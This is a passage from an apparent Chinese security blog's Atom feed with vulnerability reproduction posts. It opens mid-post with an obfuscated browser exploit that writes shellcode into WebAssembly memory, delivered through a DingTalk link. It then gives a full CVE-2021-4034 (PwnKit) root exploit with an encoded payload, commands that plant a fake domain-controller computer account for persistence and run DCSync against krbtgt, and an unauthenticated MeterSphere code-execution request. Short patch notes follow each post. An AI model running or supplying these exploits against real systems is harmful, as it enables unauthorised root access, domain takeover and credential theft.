Uint8Array([0x0,0x61,0x73,0x6d,0x1,0x0,0x0,0x0,0x1,0x89,0x80,0x80,0x80,0x0,0x2,0x60,0x1,0x7f,0x1,0x7f,0x60,0x0,0x0,0x2,0x8c,0x80,0x80,0x80,0x0,0x1,0x3,0x65,0x6e,0x76,0x4,0x70,0x75,0x74,0x73,0x0,0x0,0x3,0x82,0x80,0x80,0x80,0x0,0x1,0x1,0x4,0x84,0x80,0x80,0x80,0x0,0x1,0x70,0x0,0x0,0x5,0x83,0x80,0x80,0x80,0x0,0x1,0x0,0x1,0x6,0x81,0x80,0x80,0x80,0x0,0x0,0x7,0x92,0x80,0x80,0x80,0x0,0x2,0x6,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x2,0x0,0x5,0x68,0x65,0x6c,0x6c,0x6f,0x0,0x1,0xa,0x8d,0x80,0x80,0x80,0x0,0x1,0x87,0x80,0x80,0x80,0x0,0x0,0x41,0x10,0x10,0x0,0x1a,0xb,0xb,0x92,0x80,0x80,0x80,0x0,0x1,0x0,0x41,0x10,0xb,0xc,0x48,0x65,0x6c,0x6c,0x6f,0x20,0x57,0x6f,0x72,0x6c,0x64,0x0]);let _0x17d97a=new WebAssembly[(_0x1368('0x6','*I%3'))](new WebAssembly[(_0x1368('0x26','h0rH'))](_0x364582),_0x1ab208);let _0x4137b4=new Uint8Array(_0x17d97a[_0x1368('0x28','U7m4')][_0x1368('0x22','U7m4')][_0x1368('0x2a','CQJJ')]);return _0x17d97a[_0x1368('0x4','qxzt')][_0x1368('0x13','THAJ')];}func=wasm_func();function gc(){for(let _0x636073=0x0;_0x636073&lt;0x10;_0x636073++){new Array(0x1000000);}}function debug(){for(let _0x1aae5c=0x0;_0x1aae5c&lt;0x10000;_0x1aae5c++){for(let _0x206767=0x0;_0x206767&lt;0x20000;_0x206767++){var _0x4e0be5=_0x4e0be5+_0x1aae5c+_0x206767;}}}global_object={};setPropertyViaEmbed=(_0x704953,_0xabb024,_0x54136d)=&gt;{const _0x57fb88=document[_0x1368('0x5','qlp^')](_0x1368('0x3b','e8CW'));_0x57fb88[_0x1368('0x3a','h0rH')]=_0x54136d;_0x57fb88['type']=_0x1368('0x46','E5A6');Object['setPrototypeOf'](global_object,_0x57fb88);document[_0x1368('0x1f','4nv[')][_0x1368('0x35','ow9l')](_0x57fb88);_0x704953[_0x1368('0x23','p]KF')]=_0xabb024;_0x57fb88[_0x1368('0x25','QvKY')]();};createCorruptedPair=(_0x16735d,_0x65366a)=&gt;{const _0x5a7565={'__proto__':global_object};_0x5a7565[_0x1368('0x47','*I%3')]=0x1;setPropertyViaEmbed(_0x5a7565,_0x65366a,()=&gt;{Object[_0x1368('0x2c','e8CW')](global_object,null);_0x5a7565[_0x1368('0x8','Ub)S')]=_0x16735d;});const _0x2dc8d4={'__proto__':global_object};_0x2dc8d4[_0x1368('0x43','THAJ')]=0x1;setPropertyViaEmbed(_0x2dc8d4,_0x65366a,()=&gt;{Object[_0x1368('0x1','@XkD')](global_object,null);_0x2dc8d4[_0x1368('0xb','*j!$')]=_0x16735d;_0x5a7565[_0x1368('0x2','5I39')]=1.1;});return[_0x5a7565,_0x2dc8d4];};const array=[5.5,1.1];array['prop']=0x1;const test1=new BigUint64Array(0x2);var oob_array=[1.1,2.2,3.3];obj_array={'m':0x539,'target':gc};ab=new ArrayBuffer(0x1337);gc();gc();gc();var test=[oob_array,oob_array,oob_array,oob_array,oob_array];test[_0x1368('0x41','qlp^')]=0x1;const [object_1,object_2]=createCorruptedPair(array,test);jit=(_0x166e60,_0x539576,_0x1ae253)=&gt;{return _0x166e60['corrupted_prop'][_0x539576];};for(var i=0x0;i&lt;0x10000;++i)jit(object_1,0x0);var leak=jit(object_2,0x0);elem=d2u(leak)[0x0];print('0x'+hex(elem));const num=u2d(elem+0x4,elem+0x4);const num2=u2d(elem,elem);proto2={};setPropertyViaEmbed2=(_0x3c4ce8,_0x5b3f78,_0x570b6e)=&gt;{const _0x1411bc=document[_0x1368('0x3e','NbDf')](_0x1368('0x2d','54b8'));_0x1411bc[_0x1368('0x44','MqJl')]=_0x570b6e;_0x1411bc[_0x1368('0x0','QvKY')]=_0x1368('0x42','Xp#V');Object[_0x1368('0x1e','djTM')](proto2,_0x1411bc);document[_0x1368('0xd','h0rH')][_0x1368('0x3d','54b8')](_0x1411bc);_0x3c4ce8[_0x1368('0x33','4nv[')]=_0x5b3f78;_0x1411bc['remove']();};createCorruptedPair2=(_0x31208b,_0x4b08b5)=&gt;{const _0x2fdefd={'__proto__':proto2};_0x2fdefd[_0x1368('0x27','pndm')]=0x1;setPropertyViaEmbed2(_0x2fdefd,_0x4b08b5,()=&gt;{Object['setPrototypeOf'](proto2,null);_0x2fdefd[_0x1368('0x36','@XkD')]=_0x31208b;});const _0x5a6d27={'__proto__':proto2};_0x5a6d27[_0x1368('0x3c','XQdw')]=0x1;setPropertyViaEmbed2(_0x5a6d27,_0x4b08b5,()=&gt;{Object[_0x1368('0x9','*I%3')](proto2,null);_0x5a6d27[_0x1368('0xc','eHuP')]=_0x31208b;_0x2fdefd[_0x1368('0x14','QvKY')]=1.1;});return[_0x2fdefd,_0x5a6d27];};const [object_3,object_4]=createCorruptedPair2(array,num2);jit22=(_0x15b278,_0x32c377)=&gt;{_0x15b278[_0x1368('0x31','*clI')][_0x32c377]=num2;_0x15b278[_0x1368('0x12','1#r2')][_0x32c377+0x1]=1.1;return _0x15b278[_0x1368('0x1d','ow9l')][_0x32c377];};for(var i=0x0;i&lt;0x100000;++i)jit22(object_3,0x0);var leak2=jit22(object_4,0x0);var object_idx=undefined;var object_idx_flag=undefined;for(let i=0x0;i&lt;max_size;i++){if(d2u(oob_array[i])[0x0]==0xa72){print(_0x1368('0x2b','CQJJ')+i+_0x1368('0x18','O6t]'));print('target:\x20i:\x20'+i+'\x20hi\x201');object_idx=i;object_idx_flag=0x1;break;}if(d2u(oob_array[i])[0x1]==0xa72){print(_0x1368('0x7','3nrn')+i+_0x1368('0x2f','djTM'));print('target:\x20i:\x20'+(i+0x1)+_0x1368('0x18','O6t]'));object_idx=i+0x1;object_idx_flag=0x0;break;}}function addrof(_0x71fee0){obj_array[_0x1368('0x32','qlp^')]=_0x71fee0;return d2u(oob_array[object_idx])[object_idx_flag]-0x1;}var ab_addr=addrof(ab);print('test:\x20'+hex(ab_addr));var bk_idx=undefined;var bk_idx_flag=undefined;let flag=0x0;for(let i=0x0;i&lt;max_size;i++){if(d2u(oob_array[i])[0x0]==0x1337){console[_0x1368('0x20','qxzt')](_0x1368('0x40','M*(X')+i+_0x1368('0x2e','1027'));console[_0x1368('0x37','ki5k')](_0x1368('0x17','Ob1V')+i+_0x1368('0xe','*I%3'));bk_idx=i;bk_idx_flag=0x1;break;}if(d2u(oob_array[i])[0x1]==0x1337){console['log']('m:\x20i:\x20'+i+_0x1368('0x24','qxzt'));console[_0x1368('0xf','0$K8')](_0x1368('0x10','1#r2')+(i+0x1)+_0x1368('0x30','roPh'));bk_idx=i+0x1;bk_idx_flag=0x0;break;}}var dv=new DataView(ab);var bk_addr=d2u(oob_array[bk_idx]);function get_32(_0x251c0e){var _0x524bc3=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0){oob_array[bk_idx]=u2d(_0x251c0e,_0x524bc3[0x1]);}else{oob_array[bk_idx]=u2d(_0x524bc3[0x0],_0x251c0e);}return dv['getUint32'](0x0,!![]);}function set_32(_0x2f8305,_0x1a3c26){var _0xd022f7=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0){oob_array[bk_idx]=u2d(_0x2f8305,_0xd022f7[0x1]);}else{oob_array[bk_idx]=u2d(_0xd022f7[0x0],_0x2f8305);}dv[_0x1368('0x1a','Ob1V')](0x0,_0x1a3c26,!![]);}function set_8(_0x5d0cd7,_0x575a5c){var _0x50493b=d2u(oob_array[bk_idx]);if(bk_idx_flag==0x0){oob_array[bk_idx]=u2d(_0x5d0cd7,_0x50493b[0x1]);}else{oob_array[bk_idx]=u2d(_0x50493b[0x0],_0x5d0cd7);}dv[_0x1368('0x34','tZnn')](0x0,_0x575a5c,!![]);}var wasm_func_addr=addrof(func);print(_0x1368('0x39','54b8')+hex(wasm_func_addr));var shared_info_addr=get_32(wasm_func_addr+0xc)-0x1;print(_0x1368('0x48','Xp#V')+hex(shared_info_addr));var export_function_data_addr=get_32(shared_info_addr+0x4)-0x1;print('export_function_data_addr\x20is:\x20'+hex(export_function_data_addr));var wasm_instance_addr=get_32(export_function_data_addr+0x8)-0x1;print(_0x1368('0x1c','p]KF')+hex(wasm_instance_addr));var rwx_addr=get_32(wasm_instance_addr+0x40);print(_0x1368('0x3f','M*(X')+hex(rwx_addr));var shellcode=new Uint8Array([0x89,0xe5,0x83,0xec,0x20,0x31,0xdb,0x64,0x8b,0x5b,0x30,0x8b,0x5b,0xc,0x8b,0x5b,0x1c,0x8b,0x1b,0x8b,0x1b,0x8b,0x43,0x8,0x89,0x45,0xfc,0x8b,0x58,0x3c,0x1,0xc3,0x8b,0x5b,0x78,0x1,0xc3,0x8b,0x7b,0x20,0x1,0xc7,0x89,0x7d,0xf8,0x8b,0x4b,0x24,0x1,0xc1,0x89,0x4d,0xf4,0x8b,0x53,0x1c,0x1,0xc2,0x89,0x55,0xf0,0x8b,0x53,0x14,0x89,0x55,0xec,0xeb,0x32,0x31,0xc0,0x8b,0x55,0xec,0x8b,0x7d,0xf8,0x8b,0x75,0x18,0x31,0xc9,0xfc,0x8b,0x3c,0x87,0x3,0x7d,0xfc,0x66,0x83,0xc1,0x8,0xf3,0xa6,0x74,0x5,0x40,0x39,0xd0,0x72,0xe4,0x8b,0x4d,0xf4,0x8b,0x55,0xf0,0x66,0x8b,0x4,0x41,0x8b,0x4,0x82,0x3,0x45,0xfc,0xc3,0xba,0x78,0x78,0x65,0x63,0xc1,0xea,0x8,0x52,0x68,0x57,0x69,0x6e,0x45,0x89,0x65,0x18,0xe8,0xb8,0xff,0xff,0xff,0x31,0xc9,0x51,0x68,0x2e,0x65,0x78,0x65,0x68,0x63,0x61,0x6c,0x63,0x89,0xe3,0x41,0x51,0x53,0xff,0xd0,0x31,0xc9,0xb9,0x1,0x65,0x73,0x73,0xc1,0xe9,0x8,0x51,0x68,0x50,0x72,0x6f,0x63,0x68,0x45,0x78,0x69,0x74,0x89,0x65,0x18,0xe8,0x87,0xff,0xff,0xff,0x31,0xd2,0x52,0xff,0xd0]);for(let i=0x0;i&lt;shellcode[_0x1368('0x21','h0rH')];i++)set_8(rwx_addr+i,shellcode[i]);func();
&lt;/script&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre>
<p> payload：<br>
<code>dingtalk://dingtalkclient/page/link?url=&lt;IP&gt;/test.html&amp;pc_slide=true</code><br>
<img src="https://V-alkoinen.github.io/post-images/1645159378800.png" alt="" loading="lazy"></p>
<h1 id="漏洞修复">漏洞修复</h1>
<p> 升级至最新版</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2021-4034 Polkit local privilege escalation]]></title>
        <id>https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/</id>
        <link href="https://V-alkoinen.github.io/post/cve-2021-4034-polkit-local-privilege-escalation/">
        </link>
        <updated>2022-01-26T10:42:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-漏洞描述">一、漏洞描述</h1>
<p>  <code>Qualys</code> 研究团队在 <code>polkit</code> 的 <code>pkexec</code> 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。</p>
<h1 id="二-漏洞影响">二、漏洞影响</h1>
<p> CentOS 6：polkit-0.96-11.el6_10.2<br>
 CentOS 7：polkit-0.112-26.el7_9.1<br>
 CentOS 8.0：polkit-0.115-13.el8_5.1<br>
 CentOS 8.2：polkit-0.115-11.el8_2.2<br>
 CentOS 8.4：polkit-0.115-11.el8_4.2</p>
<p> Ubuntu 21.10 (Impish Indri) &lt; Released (0.105-31ubuntu0.1)<br>
 Ubuntu 21.04 (Hirsute Hippo) Ignored (reached end-of-life)<br>
 Ubuntu 20.04 LTS (Focal Fossa) &lt; Released (0.105-26ubuntu1.2)<br>
 Ubuntu 18.04 LTS (Bionic Beaver) &lt; Released (0.105-20ubuntu0.18.04.6)<br>
 Ubuntu 16.04 ESM (Xenial Xerus) &lt; Released (0.105-14.1ubuntu0.5+esm1)<br>
 Ubuntu 14.04 ESM (Trusty Tahr) &lt; Released (0.105-4ubuntu3.14.04.6+esm1)</p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<p> <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></p>
<p> 1、确认polkit版本</p>
<pre><code>pkexec --version
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1643194850256.png" alt="" loading="lazy"><br>
 2、创建低权限用户</p>
<pre><code>useradd laobai -p 123
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1643194431379.png" alt="" loading="lazy"><br>
 3、使用<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">python exp</a></p>
<pre><code>python3 exp.py
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1643194520673.png" alt="" loading="lazy"></figure>
<pre><code># https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py
#!/usr/bin/env python3

# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys
# hardcoded amd64 lib
from ctypes import *
from ctypes.util import find_library
import os
import zlib
import base64
import tempfile

payload = zlib.decompress(
    base64.b64decode(
        &quot;&quot;&quot;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&quot;&quot;&quot;
    )
)
libc = CDLL(find_library(&quot;c&quot;))
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
libc.execve.restype = c_ssize_t

wd = tempfile.mkdtemp()
open(wd + &quot;/pwn.so&quot;, &quot;wb&quot;).write(payload)
os.mkdir(wd + &quot;/gconv/&quot;)
open(wd + &quot;/gconv/gconv-modules&quot;, &quot;w&quot;).write(
    &quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;
)
os.mkdir(wd + &quot;/GCONV_PATH=.&quot;)
os.mknod(wd + &quot;/GCONV_PATH=./gconv&quot;)
os.chmod(wd + &quot;/GCONV_PATH=.&quot;, 0o777)
os.chmod(wd + &quot;/GCONV_PATH=./gconv&quot;, 0o777)
os.chmod(wd + &quot;/pwn.so&quot;, 0o777)
os.chdir(wd)
cmd = b&quot;/usr/bin/pkexec&quot;
argv = []
envp = [
    b&quot;gconv&quot;,
    b&quot;PATH=GCONV_PATH=.&quot;,
    b&quot;LC_MESSAGES=en_US.UTF-8&quot;,
    b&quot;XAUTHORITY=../gconv&quot;,
    b&quot;&quot;,
]

cargv = (c_char_p * (len(argv) + 1))(*argv, None)
cenv = (c_char_p * (len(envp) + 1))(*envp, None)
libc.execve(cmd, cargv, cenv)
</code></pre>
<p> 4、使用<a href="https://github.com/berdav/CVE-2021-4034">C exp</a></p>
<pre><code>git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034/
make
./cve-2021-4034
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1643194684237.png" alt="" loading="lazy"></figure>
<h1 id="四-修复方案">四、修复方案</h1>
<p> 升级polkit<br>
 Centos：</p>
<pre><code>yum clean all &amp;&amp; yum makecache
yum update polkit -y
</code></pre>
<p> Ubuntu：</p>
<pre><code>sudo apt-get update
sudo apt-get install policykit-1
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[userAccountControl权限维持]]></title>
        <id>https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/</id>
        <link href="https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/">
        </link>
        <updated>2022-01-14T08:50:48.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-漏洞详情">一、漏洞详情</h1>
<p> ·1、<a href="https://twitter.com/kaidja/status/1480212323818217479">Create a fake computer account and change the UserAccountControl value to 8192. Now the AD thinks it is a domain controller.</a><br>
 ·2、<a href="https://stealthbits.com/blog/server-untrust-account/">Active Directory persistence through userAccountControl manipulation</a><br>
 ·3、<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">Use the UserAccountControl flags to manipulate user account properties</a><br>
 概要：该漏洞主要用于权限维持，当攻击者拿下域控后，可以创建一个机器账户，并通过特殊手段，将该账户提权至域控，此时机器账户可以作为后门使用。</p>
<h1 id="二-漏洞用法">二、漏洞用法</h1>
<pre><code>#创建机器账户
New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Heo!&quot; -Force -AsPlainText)

#修改userAccountControl
Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}

#验证是否被识别为域控
Get-ADGroupMember -Identity &quot;Domain Controllers&quot; 
或
net group &quot;domain controllers&quot; /domain

#以机器账户打开cmd
runas /user:&lt;domian&gt;\SecTest2$ /netonly cmd

#Run the Dcsync command 
lsadump::dcsync /user:krbtgt
</code></pre>
<h1 id="三-漏洞复现过程">三、漏洞复现过程</h1>
<p> 1、攻击前仅有一个域控<br>
<code>net group &quot;domain controllers&quot; /domain</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642847423381.png" alt="" loading="lazy"><br>
 2、此时，假设我们通过hash传递获取了一个拥有域管权限的shell<br>
<img src="https://V-alkoinen.github.io/post-images/1642847518854.png" alt="" loading="lazy"><br>
 执行下面命令</p>
<pre><code>#创建机器账户
wmic /node:'ad-m' process call create &quot;cmd /c powershell New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Hello1234!&quot; -Force AsPlainText)&quot;

#修改userAccountControl
wmic /node:'ad-m' process call create &quot;cmd /c powershell Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}&quot;
</code></pre>
<p><img src="https://V-alkoinen.github.io/post-images/1642847721345.png" alt="" loading="lazy"><br>
 3、查看域控，发现已有两个域管<br>
<code>net group &quot;domain controllers&quot; /domain</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642847761163.png" alt="" loading="lazy"><br>
 4、后续即使修改域管密码，我们依然可以通过我们创建的机器账户回复域管权限（可以使用mimikatz同步哈希）<br>
<code>runas /user:&lt;domain&gt;\SecTest2$ /netonly cmd1</code><br>
<img src="https://V-alkoinen.github.io/post-images/1642847979300.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MeterSphere未授权远程代码执行]]></title>
        <id>https://V-alkoinen.github.io/post/metersphere-wei-shou-quan-yuan-cheng-dai-ma-zhi-xing/</id>
        <link href="https://V-alkoinen.github.io/post/metersphere-wei-shou-quan-yuan-cheng-dai-ma-zhi-xing/">
        </link>
        <updated>2022-01-11T10:21:07.000Z</updated>
        <content type="html"><![CDATA[<h1 id="一-metersphere">一、MeterSphere</h1>
<p>  <code>MeterSphere</code> 是一站式开源持续测试平台，涵盖测试跟踪、接口测试、性能测试、 团队协作等功能，该漏洞由于自定义插件功能处存在权限验证缺陷，致使攻击者无需经过身份验证即可通过构造特定的请求在目标系统上远程执行任意代码。</p>
<h1 id="二-影响版本">二、影响版本</h1>
<p>  <code>v1.13.0 &lt;= MeterSphere &lt;= v1.16.3</code></p>
<h1 id="三-漏洞复现">三、漏洞复现</h1>
<p>  MeterSphere安装</p>
<pre><code>wget https://github.com/metersphere/metersphere/releases/download/v1.16.3/metersphere-online-installer-v1.16.3.tar.gz
tar zxvf metersphere-online-installer-v1.16.3.tar.gz
cd metersphere-online-installer-v1.16.3/
MSVERSION=&quot;v1.16.3&quot;
sed -i -e &quot;s#MS_IMAGE_TAG=.*#MS_IMAGE_TAG=${MSVERSION}#g&quot; install.conf
sed -i -e &quot;s#MS_IMAGE_PREFIX=.*#MS_IMAGE_PREFIX=registry.cn-qingdao.aliyuncs.com\/metersphere#g&quot; install.conf
/bin/bash install.sh
</code></pre>
<p>  访问 http://&lt;IP&gt;:8081<br>
<img src="https://V-alkoinen.github.io/post-images/1644666257791.png" alt="" loading="lazy"><br>
  发送如下数据包：</p>
<pre><code>
POST /plugin/customMethod HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/75.0.3770.100 Safari/537.36
Content-Length: 34
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close

{&quot;entry&quot;: &quot;Evil&quot;, &quot;request&quot;: &quot;id&quot;}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644732300537.png" alt="" loading="lazy"></figure>
<h1 id="四-漏洞修复">四、漏洞修复</h1>
<p>升级<code>MeterSphere</code> 至v1.16.4及以上版本<a href="https://community.fit2cloud.com/#/products/metersphere/downloads">https://community.fit2cloud.com/#/products/metersphere/downloads</a></p>
]]></content>
    </entry>
</feed>